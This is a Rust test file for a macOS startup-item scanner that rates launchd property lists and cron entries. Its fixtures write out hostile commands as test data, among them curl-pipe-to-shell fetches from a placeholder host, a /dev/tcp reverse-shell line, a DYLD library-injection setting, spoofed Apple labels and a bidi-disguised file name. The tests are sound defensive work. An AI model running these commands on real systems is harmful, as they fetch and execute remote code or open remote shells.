                "/tmp is writable by others"
            );
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn names_shown_to_people_lose_bidi_and_zero_width_characters() {
        assert_eq!(
            clean("evil\u{202E}gpj.exe\u{200B}\u{FEFF}", 300),
            "evilgpj.exe"
        );
        let mut report = StartupReport {
            items: vec![StartupItem {
                name: "a\u{2066}b\u{202E}".into(),
                kind: "cron".into(),
                location: "l\u{200F}".into(),
                program: None,
                arguments: vec![],
                script: None,
                enabled: None,
                exists: None,
                trusted: false,
                verdict: Verdict::NotChecked,
                score: None,
                reasons: vec!["r\u{200E}".into()],
                allowed: false,
                runs_as: "you".into(),
            }],
            ..StartupReport::default()
        };
        report.clamp();
        assert_eq!(report.items[0].name, "ab");
        assert_eq!(report.items[0].location, "l");
        assert_eq!(report.items[0].reasons[0], "r");
    }

    #[test]
    fn digests_parse_only_when_exact() {
        assert_eq!(digest_of(&"ab".repeat(32)), Some([0xab; 32]));
        assert_eq!(digest_of("ab"), None);
        assert_eq!(digest_of(&"zz".repeat(32)), None);
    }

    #[cfg(target_os = "macos")]
    mod on_disk {
        use super::*;
        use std::collections::BTreeMap;
        use std::os::unix::fs::{symlink, PermissionsExt};
        use std::process::Command;

        fn scratch(tag: &str) -> PathBuf {
            let dir =
                std::env::temp_dir().join(format!("thenex-startup-{tag}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&dir);
            fs::create_dir_all(dir.join("launch")).unwrap();
            dir
        }

        fn plist(label: &str, program: &str, args: &[&str], extra: &str) -> String {
            let args: String = args
                .iter()
                .map(|a| format!("<string>{a}</string>"))
                .collect();
            format!(
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>Label</key><string>{label}</string><key>ProgramArguments</key><array><string>{program}</string>{args}</array>{extra}</dict></plist>"
            )
        }

        fn run_in(dir: &Path, limits: Limits) -> StartupReport {
            let cfg = Arc::new(AppConfig::for_base_dir(&dir.join("TheNex")));
            let scanner = Arc::new(BinaryAiScanner::heuristic_only());
            list(&cfg, &scanner, Some(&dir.join("launch")), limits)
        }

        fn item<'a>(report: &'a StartupReport, name: &str) -> &'a StartupItem {
            report
                .items
                .iter()
                .find(|i| i.name == name)
                .unwrap_or_else(|| panic!("{name} missing: {report:?}"))
        }

        fn snapshot(dir: &Path) -> BTreeMap<PathBuf, (u64, std::time::SystemTime)> {
            let mut out = BTreeMap::new();
            let mut stack = vec![dir.to_path_buf()];
            while let Some(next) = stack.pop() {
                for entry in fs::read_dir(&next).unwrap().flatten() {
                    let meta = fs::symlink_metadata(entry.path()).unwrap();
                    out.insert(entry.path(), (meta.len(), meta.modified().unwrap()));
                    if meta.is_dir() {
                        stack.push(entry.path());
                    }
                }
            }
            out
        }

        #[test]
        fn definitions_good_bad_and_hostile_are_each_reported_and_nothing_changes() {
            let dir = scratch("all");
            let launch = dir.join("launch");
            fs::write(
                launch.join("good.plist"),
                plist(
                    "com.example.good",
                    "/bin/ls",
                    &["-l"],
                    "<key>RunAtLoad</key><true/>",
                ),
            )
            .unwrap();
            // Binary property list.
            let xml = dir.join("bin-src.plist");
            fs::write(
                &xml,
                plist(
                    "com.example.binary",
                    "/bin/ls",
                    &[],
                    "<key>Disabled</key><true/>",
                ),
            )
            .unwrap();
            let status = Command::new("/usr/bin/plutil")
                .args(["-convert", "binary1", "-o"])
                .arg(launch.join("binary.plist"))
                .arg(&xml)
                .status()
                .unwrap();
            assert!(status.success());
            fs::write(
                launch.join("broken.plist"),
                b"<plist><dict><key>Label</key>",
            )
            .unwrap();
            fs::write(launch.join("garbage.plist"), [0xffu8, 0xfe, 0, 1, 2]).unwrap();
            fs::write(
                launch.join("missing.plist"),
                plist("com.example.missing", "/nonexistent/thing", &[], ""),
            )
            .unwrap();
            fs::write(
                launch.join("huge.plist"),
                vec![b' '; MAX_DEFINITION_BYTES as usize + 1],
            )
            .unwrap();
            // A link to a real definition is followed; a link to a pipe, a pipe and a folder are not opened.
            symlink(xml.as_path(), launch.join("link.plist")).unwrap();
            let fifo = dir.join("pipe");
            let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
            // SAFETY: valid NUL-terminated path.
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
            symlink(&fifo, launch.join("linkpipe.plist")).unwrap();
            let direct = launch.join("pipe.plist");
            let c = std::ffi::CString::new(direct.to_str().unwrap()).unwrap();
            // SAFETY: valid NUL-terminated path.
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
            fs::create_dir(launch.join("folder.plist")).unwrap();
            fs::write(launch.join("ignored.txt"), b"not a definition").unwrap();

            let before = snapshot(&dir);
            let report = run_in(&dir, Limits::default());
            assert_eq!(snapshot(&dir), before, "listing must not touch any file");
            assert!(
                !dir.join("TheNex").exists(),
                "no data folder, no event, no quarantine"
            );

            let good = item(&report, "com.example.good");
            assert_eq!(
                (good.verdict, good.trusted, good.exists, good.enabled),
                (Verdict::NothingFound, true, Some(true), Some(true))
            );
            assert_eq!(
                (
                    good.program.as_deref(),
                    good.arguments.as_slice(),
                    good.runs_as.as_str()
                ),
                (Some("/bin/ls"), &["-l".to_string()][..], "you")
            );
            let binary = item(&report, "com.example.binary");
            assert_eq!(
                (binary.verdict, binary.enabled),
                (Verdict::NotChecked, Some(false))
            );
            assert!(binary.reasons[0].contains("binary property list"));
            let missing = item(&report, "com.example.missing");
            assert_eq!(
                (missing.verdict, missing.exists),
                (Verdict::WorthALook, Some(false))
            );
            assert!(missing.reasons[0].contains("not there"));
            // What could not be read is an item too, never left out.
            for name in ["broken", "garbage", "huge", "linkpipe", "pipe", "folder"] {
                let bad = item(&report, name);
                assert_eq!(
                    bad.verdict,
                    Verdict::WorthALook,
                    "{name}: {:?}",
                    bad.reasons
                );
            }
            assert_eq!(
                report.items.len(),
                10,
                "those, good, binary, the followed link and missing: {report:?}"
            );
            assert!(report.unreadable.is_empty());
            assert!(report
                .items
                .iter()
                .all(|i| i.verdict.rank() >= report.items[0].verdict.rank()));
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn interpreters_scripts_and_borrowed_names_are_called_out() {
            let dir = scratch("risky");
            let launch = dir.join("launch");
            let script = dir.join("job.sh");
            fs::write(&script, "#!/bin/sh\necho hi\n").unwrap();
            let fake = dir.join("fake-helper");
            fs::write(&fake, "#!/bin/sh\necho hi\n").unwrap();
            fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
            let write = |file: &str, body: String| fs::write(launch.join(file), body).unwrap();
            write(
                "a.plist",
                plist(
                    "com.example.script",
                    "/bin/sh",
                    &[script.to_str().unwrap()],
                    "",
                ),
            );
            write(
                "b.plist",
                plist("com.example.gone", "/bin/sh", &["/nonexistent/job.sh"], ""),
            );
            write(
                "c.plist",
                plist(
                    "com.example.fetch",
                    "/bin/sh",
                    &["-c", "curl http://x.invalid/a | sh"],
                    "",
                ),
            );
            write(
                "d.plist",
                plist("com.apple.fake.helper", fake.to_str().unwrap(), &[], ""),
            );
            write(
                "e.plist",
                plist("com.apple.real.helper", "/bin/ls", &[], ""),
            );
            write("f.plist", plist("com.example.loose", "/bin/ls", &[], ""));
            fs::set_permissions(launch.join("f.plist"), fs::Permissions::from_mode(0o666)).unwrap();

            let report = run_in(&dir, Limits::default());
            let with_script = item(&report, "com.example.script");
            assert_eq!(with_script.script.as_deref(), script.to_str());
            assert!(with_script.trusted, "the interpreter is trusted");
            assert!(with_script
                .reasons
                .iter()
                .any(|r| r.contains("does not make the script trusted")));
            assert!(
                with_script
                    .reasons
                    .iter()
                    .any(|r| r.contains("temporary folder")),
                "{:?}",
                with_script.reasons
            );
            let gone = item(&report, "com.example.gone");
            assert!(gone
                .reasons
                .iter()
                .any(|r| r.contains("script it runs is not there")));
            let fetch = item(&report, "com.example.fetch");
            assert_eq!(fetch.verdict, Verdict::Suspicious);
            assert!(
                fetch.reasons[0].contains("malware uses"),
                "{:?}",
                fetch.reasons
            );
            let fake_item = item(&report, "com.apple.fake.helper");
            assert_eq!(fake_item.verdict, Verdict::Suspicious);
            assert!(fake_item.reasons[0].contains("comes from Apple"));
            assert_eq!(
                item(&report, "com.apple.real.helper").verdict,
                Verdict::NothingFound
            );
            let loose = item(&report, "com.example.loose");
            assert_eq!(loose.verdict, Verdict::WorthALook);
            assert!(loose.reasons[0].contains("Other users"));
            assert_eq!(
                report.items[0].verdict,
                Verdict::Suspicious,
                "suspicious first"
            );
            let _ = fs::remove_dir_all(&dir);
        }

        fn verdict_of(name: &str, program: &str, given: &[&str]) -> StartupItem {
            judge(
                &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
                &BinaryAiScanner::heuristic_only(),
                Candidate {
                    name: name.into(),
                    kind: "launch_agent",
                    program: Some(program.into()),
                    arguments: args(given),
                    ..Candidate::default()
                },
            )
        }

        #[test]
        fn nothing_is_green_unless_what_runs_was_inspected() {
            use Verdict::{NotChecked, NothingFound, Suspicious, WorthALook};
            // /etc/profile is a script on every Mac, outside every place that is risky by itself.
            for (program, given, want) in [
                ("/bin/ls", &[][..], NothingFound),
                ("/bin/ls", &["-l"], NothingFound),
                ("/bin/ls", &["/etc/profile"], WorthALook),
                ("/usr/sbin/sysctl", &["-a"], NotChecked),
                ("/bin/cat", &["/etc/profile"], WorthALook),
                ("/bin/sh", &[], WorthALook),
                ("/bin/sh", &["-c", "/bin/ls"], WorthALook),
                ("/bin/sh", &["-c", "curl http://x.invalid | sh"], Suspicious),
                (
                    "/bin/bash",
                    &["-c", "exec 5<>/dev/tcp/1.2.3.4/5; sh <&5"],
                    WorthALook,
                ),
                ("/bin/sh", &["/etc/profile"], NotChecked),
                ("/bin/bash", &["-o", "pipefail", "/etc/profile"], NotChecked),
                ("/bin/sh", &["/etc"], WorthALook),
                ("/bin/sh", &["/dev/null"], WorthALook),
                ("/bin/sh", &["/nonexistent/a"], WorthALook),
                ("/bin/sh", &["/etc/sudoers"], NotChecked),
                ("/bin/sh", &["a.sh"], WorthALook),
                ("/bin/bash", &["/bin/ls"], NotChecked),
                ("/usr/bin/perl", &["-e", "1"], WorthALook),
                ("/usr/bin/ruby", &["-e", "1"], WorthALook),
                ("/usr/bin/python3", &["-c", "1"], WorthALook),
                ("/usr/bin/python3", &["-m", "http.server"], WorthALook),
                ("/usr/bin/python3", &["/etc/profile"], NotChecked),
                ("/usr/bin/awk", &["BEGIN{system(\"x\")}"], WorthALook),
                ("/usr/bin/env", &["-S", "sh -c x"], WorthALook),
                ("/usr/bin/env", &["-u", "A", "/bin/ls"], WorthALook),
                ("/usr/bin/env", &["/bin/ls"], WorthALook),
                (
                    "/usr/bin/env",
                    &["sh", "-c", "curl http://x.invalid | sh"],
                    Suspicious,
                ),
                ("/usr/bin/nohup", &["/bin/ls"], WorthALook),
                ("/usr/bin/nice", &["/bin/ls"], WorthALook),
                ("/usr/bin/open", &["-a", "X"], WorthALook),
                (
                    "/usr/bin/osascript",
                    &["-l", "JavaScript", "/etc/profile"],
                    NotChecked,
                ),
                ("/usr/bin/osascript", &["-e", "beep"], WorthALook),
                ("/usr/bin/make", &[], WorthALook),
                ("/etc/profile", &[], NotChecked),
                ("ls", &[], NotChecked),
                ("./ls", &[], NotChecked),
                // osascript's own command line shows its whole program, so the live guard stops
                // a shell call with a /tmp/ path there (only a shell that merely mentions it is
                // alert-only), and so does this check.
                (
                    "/usr/bin/osascript",
                    &["-e", "do shell script \"cp /tmp/a /b\""],
                    Suspicious,
                ),
            ] {
                let item = verdict_of("com.example.x", program, given);
                assert_eq!(
                    item.verdict, want,
                    "{program} {given:?}: {:?}",
                    item.reasons
                );
                // An Apple label is no shield: it never makes a verdict better.
                let item = verdict_of("com.apple.x", program, given);
                assert!(
                    item.verdict.rank() <= want.rank(),
                    "com.apple.x {program} {given:?}"
                );
            }
        }

        #[test]
        fn links_copies_and_odd_spellings_are_judged_as_what_they_are() {
            let dir = scratch("spelling");
            let real = fs::canonicalize(&dir).unwrap();
            let link = dir.join("helper");
            symlink("/bin/sh", &link).unwrap();
            let item = verdict_of("com.apple.x", link.to_str().unwrap(), &["-c", "x"]);
            assert!(
                item.reasons.iter().any(|r| r.contains("It starts sh")),
                "{:?}",
                item.reasons
            );
            assert!(item
                .reasons
                .iter()
                .any(|r| r.contains("leads to another file")));
            let copy = dir.join("updater");
            fs::copy("/bin/sh", &copy).unwrap();
            let item = verdict_of(
                "com.example.x",
                copy.to_str().unwrap(),
                &["-c", "curl http://x.invalid|sh"],
            );
            assert_eq!(item.verdict, Verdict::Suspicious, "{:?}", item.reasons);
            assert!(item
                .reasons
                .iter()
                .any(|r| r.contains("copy of a system tool")));
            // Spellings that once looked like the sealed system.
            let script = real.join("evil");
            fs::write(&script, "#!/bin/sh\n").unwrap();
            for prefix in [
                "/System//Volumes/Data",
                "/System/volumes/data",
                "/System/./Volumes/Data",
                "/usr/bin/../..",
            ] {
                let text = format!("{prefix}{}", script.display());
                let item = verdict_of("com.apple.x", &text, &[]);
                assert_eq!(
                    (item.trusted, item.verdict),
                    (false, Verdict::Suspicious),
                    "{text}: {:?}",
                    item.reasons
                );
            }
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn the_exact_file_is_judged_however_long_or_odd_its_name() {
            let dir = scratch("exact");
            let launch = dir.join("launch");
            // A cut or cleaned name would name these instead.
            fs::write(dir.join("a b"), "x").unwrap();
            let deep = dir
                .join("d".repeat(200))
                .join("e".repeat(200))
                .join("f".repeat(200));
            fs::create_dir_all(&deep).unwrap();
            let long = deep.join("run");
            fs::write(&long, "x").unwrap();
            let newline = dir.join("a\nb");
            fs::write(
                launch.join("a.plist"),
                plist("newline", newline.to_str().unwrap(), &[], ""),
            )
            .unwrap();
            fs::write(
                launch.join("b.plist"),
                plist("long", long.to_str().unwrap(), &[], ""),
            )
            .unwrap();
            let mut many = vec!["-x"; 100];
            let script = format!("{}/{}", dir.display(), "s".repeat(250));
            fs::write(&script, "x").unwrap();
            many.push(&script);
            fs::write(launch.join("c.plist"), plist("many", "/bin/sh", &many, "")).unwrap();
            let report = run_in(&dir, Limits::default());
            assert_eq!(item(&report, "newline").exists, Some(false));
            assert_eq!(item(&report, "long").exists, Some(true));
            let many = item(&report, "many");
            assert!(many.script.is_some(), "{many:?}");
            assert!(
                !many.reasons.iter().any(|r| r.contains("not there")),
                "{many:?}"
            );
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn no_setting_can_make_a_definition_disappear() {
            let dir = scratch("hide");
            let launch = dir.join("launch");
            let deep = |n| {
                format!(
                    "<key>k</key>{}{}",
                    "<array>".repeat(n),
                    "</array>".repeat(n)
                )
            };
            for (name, extra) in [
                (
                    "date",
                    "<key>k</key><date>2020-01-01T00:00:00Z</date>".to_string(),
                ),
                ("data", "<key>k</key><data>AAAA</data>".into()),
                ("nan", "<key>k</key><real>nan</real>".into()),
                ("deep", deep(300)),
                ("deeper", deep(3000)),
            ] {
                fs::write(
                    launch.join(format!("{name}.plist")),
                    plist(
                        name,
                        "/bin/sh",
                        &["-c", "curl http://x.invalid | sh"],
                        &extra,
                    ),
                )
                .unwrap();
            }
            let report = run_in(&dir, Limits::default());
            for name in ["date", "data", "nan", "deep"] {
                assert_eq!(item(&report, name).verdict, Verdict::Suspicious, "{name}");
            }
            assert_eq!(item(&report, "deeper").verdict, Verdict::WorthALook);
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn settings_that_change_what_runs_are_called_out() {
            let dir = scratch("settings");
            let launch = dir.join("launch");
            let env = |name: &str| {
                format!("<key>EnvironmentVariables</key><dict><key>{name}</key><string>/x</string></dict>")
            };
            for (name, extra, want) in [
                ("bashenv", env("BASH_ENV"), Verdict::WorthALook),
                ("dyld", env("DYLD_INSERT_LIBRARIES"), Verdict::WorthALook),
                ("home", env("HOME"), Verdict::WorthALook),
                ("lang", env("LANG"), Verdict::NothingFound),
                ("unbuffered", env("PYTHONUNBUFFERED"), Verdict::NothingFound),
                ("unknown", env("SOMETHING_ELSE"), Verdict::NotChecked),
                (
                    "stdin",
                    "<key>StandardInPath</key><string>/x</string>".into(),
                    Verdict::WorthALook,
                ),
                (
                    "root",
                    "<key>RootDirectory</key><string>/x</string>".into(),
                    Verdict::WorthALook,
                ),
                (
                    "inetd",
                    "<key>inetdCompatibility</key><dict/>".into(),
                    Verdict::WorthALook,
                ),
                (
                    "odd",
                    "<key>ProgramArguments</key><array><integer>1</integer></array>".into(),
                    Verdict::WorthALook,
                ),
                (
                    "keepoff",
                    "<key>KeepAlive</key><false/>".into(),
                    Verdict::NothingFound,
                ),
                (
                    "keepon",
                    "<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>".into(),
                    Verdict::NothingFound,
                ),
            ] {
                fs::write(
                    launch.join(format!("{name}.plist")),
                    plist(name, "/bin/ls", &[], &extra),
                )
                .unwrap();
                let report = run_in(&dir, Limits::default());
                let got = item(&report, name);
                assert_eq!(got.verdict, want, "{name}: {:?}", got.reasons);
            }
            let report = run_in(&dir, Limits::default());
            assert_eq!(item(&report, "keepoff").enabled, None);
            assert_eq!(item(&report, "keepon").enabled, Some(true));
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn cron_lines_are_judged_as_the_shell_commands_they_are() {
            let judged = |text: &str| -> Vec<StartupItem> {
                super::super::launchd::cron_candidates(text)
                    .into_iter()
                    .map(|c| {
                        judge(
                            &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
                            &BinaryAiScanner::heuristic_only(),
                            c,
                        )
                    })
                    .collect()
            };
            for (line, want) in [
                ("@reboot /bin/ls -l", Verdict::NothingFound),
                (
                    "* * * * * curl http://x.invalid/a | sh",
                    Verdict::Suspicious,
                ),
                (
                    "* * * * * /bin/ls; curl http://x.invalid/a|sh",
                    Verdict::Suspicious,
                ),
                ("* * * * * cd /x && ./a", Verdict::WorthALook),
                ("* * * * * /bin/ls $(x)", Verdict::WorthALook),
                ("* * * * * /etc/profile", Verdict::NotChecked),
            ] {
                let items = judged(line);
                assert_eq!(items[0].verdict, want, "{line}: {:?}", items[0].reasons);
            }
            for (setting, want) in [
                ("SHELL=/tmp/x", Verdict::WorthALook),
                ("SHELL=/bin/zsh", Verdict::WorthALook),
                ("BASH_ENV=/x", Verdict::WorthALook),
                ("HOME=/x", Verdict::WorthALook),
                ("X=1", Verdict::NotChecked),
                ("SHELL=/bin/bash", Verdict::NothingFound),
                ("MAILTO=me", Verdict::NothingFound),
            ] {
                let items = judged(&format!("{setting}\n@daily /bin/ls\n"));
                assert_eq!(items[0].verdict, want, "{setting}");
            }
        }

        #[test]
        fn a_crontab_that_cannot_be_listed_is_said() {
            use super::super::launchd::{add_cron, Answer};
            let answer = |ok, out: &str, err: &str| {
                let mut found = found(10, Instant::now());
                add_cron(
                    &mut found,
                    Some(Answer {
                        ok,
                        out: out.into(),
                        err: err.into(),
                    }),
                );
                (found.candidates.len(), found.unreadable.len())
            };
            assert_eq!(answer(true, "@daily /bin/ls\n", ""), (1, 0));
            assert_eq!(answer(false, "", "crontab: no crontab for me"), (0, 0));
            assert_eq!(answer(false, "@daily /bin/ls\n", "not allowed"), (0, 1));
            let mut none = found(10, Instant::now());
            add_cron(&mut none, None);
            assert_eq!(none.unreadable.len(), 1);
        }

        #[test]
        fn a_failed_property_list_reader_is_not_believed() {
            use super::super::launchd::{run_limited, settings, Answer};
            let xml = "<plist version=\"1.0\"><dict/></plist>";
            let answer = |ok| {
                settings(Some(Answer {
                    ok,
                    out: xml.into(),
                    err: String::new(),
                }))
            };
            assert!(answer(true).is_ok());
            assert!(answer(false).is_err_and(|(look, _)| look));
            assert!(settings(None).is_err_and(|(look, _)| look));
            assert!(run_limited("/usr/bin/false", &[], b"").is_some_and(|a| !a.ok));
            assert!(run_limited("/bin/cat", &[], b"x").is_some_and(|a| a.ok && a.out == b"x"));
        }

        #[test]
        fn definitions_are_not_opened_after_the_collection_deadline() {
            let dir = scratch("late");
            fs::write(
                dir.join("launch/a.plist"),
                plist("com.example.a", "/bin/ls", &[], ""),
            )
            .unwrap();
            for (deadline, read) in [
                (Instant::now() + Duration::from_secs(60), true),
                (Instant::now(), false),
            ] {
                let mut found = found(10, deadline);
                collect(&mut found, Some(&dir.join("launch")));
                let (_, c) = &found.candidates[0];
                assert_eq!((c.program.is_some(), found.truncated), (read, !read));
                assert_eq!(c.doubts.iter().any(|d| d == NO_TIME), !read);
            }
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn arguments_that_name_code_are_worth_a_look_and_others_are_not_checked() {
            let dir = fs::canonicalize(scratch("args")).unwrap();
            let file = |name: &str, body: &[u8], mode: u32| {
                let path = dir.join(name);
                fs::write(&path, body).unwrap();
                fs::set_permissions(&path, fs::Permissions::from_mode(mode)).unwrap();
                path.display().to_string()
            };
            let code = file("code.js", b"x", 0o644);
            let shell = file("job", b"#!/bin/sh\n", 0o644);
            let tool = file("tool", b"x", 0o755);
            let data = file("data.json", b"{}", 0o644);
            let folder = dir.join("addon").display().to_string();
            fs::create_dir(&folder).unwrap();
            let cfg = AppConfig::for_base_dir(&dir.join("TheNex"));
            let check = |args: &[&str]| {
                let mut f = Findings::default();
                check_arguments(&cfg, &self::args(args), "app", false, &[&dir], &mut f);
                assert!(f.strong.is_empty() && f.info.is_empty());
                (f.soft.len(), f.unsure.len())
            };
            for harmless in [&["--a", "-b", "--c=d"][..], &[]] {
                assert_eq!(check(harmless), (0, 0), "{harmless:?}");
            }
            for look in [
                &[code.as_str()][..],
                &[&shell],
                &["-x", &tool],
                &["code.js"],
                &["--x=code.js"],
                &[&format!("--load={data},{code}")],
                &[&format!("-I{code}")],
                &[&format!("file://{code}")],
                &[&format!("--load-extension={folder}")],
                &["--plugin-dir", &folder],
                &["--plugins=addon"],
            ] {
                assert_eq!(check(look), (1, 0), "{look:?}");
            }
            for unknown in [
                &[data.as_str()][..],
                &["--x=data.json"],
                &[&folder],
                &["run"],
                &["-c", "x y"],
                &["http://x.invalid/a"],
                &["/nonexistent/a"],
            ] {
                assert_eq!(check(unknown), (0, 1), "{unknown:?}");
            }
            // And a program outside the system folders really is held to it.
            let said = |args: &[&str], what: &str| {
                verdict_of("com.example.x", &tool, args)
                    .reasons
                    .iter()
                    .any(|r| r.contains(what))
            };
            assert!(said(&["run"], "instructions (run)"));
            assert!(said(&[&code], "gives the program a file"));
            assert!(!said(&["--run"], "gives the program"));
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn a_copied_system_tool_a_huge_program_and_a_borrowed_name_are_said_plainly() {
            let dir = scratch("plainly");
            let said = |item: &StartupItem, what: &str| {
                assert!(
                    item.reasons.iter().any(|r| r.contains(what)),
                    "{what}: {item:?}"
                );
            };
            let copy = dir.join("copied");
            fs::copy("/bin/ls", &copy).unwrap();
            said(
                &verdict_of("x", copy.to_str().unwrap(), &[]),
                "copy of a system tool",
            );
            // A program by its first bytes, far too large to be scored.
            let huge = dir.join("huge");
            let mut bytes = fs::read("/bin/ls").unwrap();
            bytes.push(0); // no longer as Apple signed it
            fs::write(&huge, bytes).unwrap();
            let cfg = AppConfig::for_base_dir(&dir);
            let scanner = BinaryAiScanner::heuristic_only().with_max_scan_bytes(16);
            let mut f = Findings::default();
            assert!(!look_at(&cfg, &scanner, &huge, false, &mut f).clean);
            assert!(f.info[0].contains("too large or too damaged"), "{f:?}");
            let helper = dir.join("helper");
            fs::write(&helper, "#!/bin/sh\n").unwrap();
            for (name, want) in [
                ("com.microsoft.helper", Verdict::Suspicious),
                ("Microsoft Word helper", Verdict::WorthALook),
                ("Apple Music sync", Verdict::WorthALook),
            ] {
                let item = verdict_of(name, helper.to_str().unwrap(), &[]);
                assert_eq!(item.verdict, want, "{name}: {item:?}");
                said(&item, "Its name");
            }
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn who_could_change_or_read_a_program_is_told_apart() {
            let dir = scratch("perms");
            let folder = dir.join("shared");
            fs::create_dir(&folder).unwrap();
            let program = folder.join("run");
            fs::write(&program, "x").unwrap();
            let text = program.to_str().unwrap();
            let said =
                |item: &StartupItem, what: &str| item.reasons.iter().any(|r| r.contains(what));
            assert!(!said(&verdict_of("x", text, &[]), "Other users"));
            fs::set_permissions(&folder, fs::Permissions::from_mode(0o777)).unwrap();
            assert!(said(&verdict_of("x", text, &[]), "or a folder it is in"));
            // No permission is not the same as gone (root, which can always look, is exempt).
            fs::set_permissions(&folder, fs::Permissions::from_mode(0o000)).unwrap();
            let hidden = verdict_of("x", text, &[]);
            if fs::metadata(&program).is_err() {
                assert_eq!((hidden.verdict, hidden.exists), (Verdict::NotChecked, None));
                assert!(said(&hidden, "may not have permission"));
            }
            fs::set_permissions(&folder, fs::Permissions::from_mode(0o755)).unwrap();
            // Something that runs as root from a file an ordinary account owns.
            let daemon = |program: &str| {
                judge(
                    &AppConfig::for_base_dir(Path::new("/nonexistent/thenex")),
                    &BinaryAiScanner::heuristic_only(),
                    Candidate {
                        program: Some(program.into()),
                        as_root: true,
                        ..Candidate::default()
                    },
                )
            };
            assert_eq!(daemon("/bin/ls").verdict, Verdict::NothingFound);
            let owned = fs::metadata(&program).map(|m| std::os::unix::fs::MetadataExt::uid(&m));
            if owned.unwrap() != 0 {
                assert!(said(&daemon(text), "ordinary account owns"));
            }
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn what_starts_from_a_never_scan_place_is_listed_but_not_opened() {
            let dir = crate::skiplist::tests::listable("startup");
            let private = dir.join("Private");
            fs::create_dir_all(dir.join("launch")).unwrap();
            fs::create_dir(&private).unwrap();
            let program = private.join("helper");
            fs::write(&program, "#!/bin/sh\n").unwrap();
            fs::write(
                dir.join("launch").join("a.plist"),
                plist("com.example.helper", program.to_str().unwrap(), &[], ""),
            )
            .unwrap();
            let cfg = AppConfig::for_base_dir(&dir.join("TheNex"));
            assert!(crate::skiplist::add(&cfg, &private, true).unwrap());
            let report = run_in(&dir, Limits::default());
            let found = item(&report, "com.example.helper");
            assert_eq!(found.verdict, Verdict::NotChecked, "{found:?}");
            assert!(found.reasons.iter().any(|r| r == NEVER_SCANNED));
            assert!(!found.trusted && found.score.is_none() && found.exists == Some(true));
            // A link to a definition kept in a listed folder is not followed.
            fs::rename(dir.join("launch").join("a.plist"), private.join("a.plist")).unwrap();
            std::os::unix::fs::symlink(private.join("a.plist"), dir.join("launch").join("a.plist"))
                .unwrap();
            let linked = run_in(&dir, Limits::default());
            assert!(format!("{linked:?}").contains(NEVER_SCANNED), "{linked:?}");
            assert!(!linked.items.iter().any(|i| i.name == "com.example.helper"));
            let scanner = BinaryAiScanner::heuristic_only();
            let mut f = Findings::default();
            let looked = look_at(&cfg, &scanner, &program, true, &mut f);
            assert!(!looked.clean && !looked.allowed && f.unsure == [NEVER_SCANNED]);
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn an_always_allowed_file_counts_only_for_what_really_runs() {
            let dir = scratch("allowed");
            let cfg = AppConfig::for_base_dir(&dir.join("TheNex"));
            cfg.ensure_dirs().unwrap();
            let scanner = BinaryAiScanner::heuristic_only();
            for (name, body, direct) in [
                ("plain", "#!/bin/sh\necho 1\n", true),
                ("env", "#!/usr/bin/env sh\necho 2\n", false),
                ("other", "#!/nonexistent/evil\necho 3\n", false),
            ] {
                let file = fs::canonicalize(&dir).unwrap().join(name);
                fs::write(&file, body).unwrap();
                let mut f = Findings::default();
                assert!(
                    !look_at(&cfg, &scanner, &file, true, &mut f).allowed,
                    "{name}"
                );
                let hash = crate::known_bad::hash_file(&file, u64::MAX).unwrap();
                let entry = crate::allowlist::AllowedFile::new(
                    &crate::quarantine::to_hex(&hash),
                    name,
                    "MANUAL",
                )
                .unwrap();
                crate::allowlist::add(&cfg, entry).unwrap();
                let looked = look_at(&cfg, &scanner, &file, true, &mut f);
                assert!(looked.allowed && !looked.clean, "{name}");
                assert_eq!(runs_itself(&cfg, &scanner, &file), direct, "{name}");
            }
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn floods_of_files_are_bounded_and_said() {
            let dir = scratch("flood");
            let launch = dir.join("launch");
            for n in 0..MAX_DIR_ENTRIES + 100 {
                fs::write(launch.join(format!("junk{n}.txt")), b"").unwrap();
            }
            fs::write(
                launch.join("z.plist"),
                plist("com.example.z", "/bin/ls", &[], ""),
            )
            .unwrap();
            let report = run_in(&dir, Limits::default());
            assert!(
                !report.truncated && report.items.len() == 1,
                "other files do not count"
            );
            // More links to one big definition than there is time for.
            let mut big = plist(
                "com.example.big",
                "/bin/ls",
                &[],
                "<key>k</key><string>@</string>",
            );
            big = big.replace('@', &"x".repeat(MAX_DEFINITION_BYTES as usize - 1000));
            fs::write(dir.join("big"), big).unwrap();
            for n in 0..MAX_ITEMS + 10 {
                symlink(dir.join("big"), launch.join(format!("l{n}.plist"))).unwrap();
            }
            let started = Instant::now();
            let limits = Limits {
                total: Duration::from_secs(2),
                ..Limits::default()
            };
            let report = run_in(&dir, limits);
            assert!(
                started.elapsed() < Duration::from_secs(12),
                "{:?}",
                started.elapsed()
            );
            assert!(report.truncated);
            assert_eq!(report.items.len(), MAX_ITEMS);
            assert!(report
                .items
                .iter()
                .any(|i| i.reasons[0].contains("not enough time")));
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn an_account_called_you_is_not_shown_as_you() {
            let settings = [
                ("Program".to_string(), Setting::Text("/bin/ls".into())),
                ("UserName".to_string(), Setting::Text("you".into())),
            ];
            let c = super::super::launchd::candidate(
                &settings,
                Path::new("/x.plist"),
                "launch_daemon",
                false,
            );
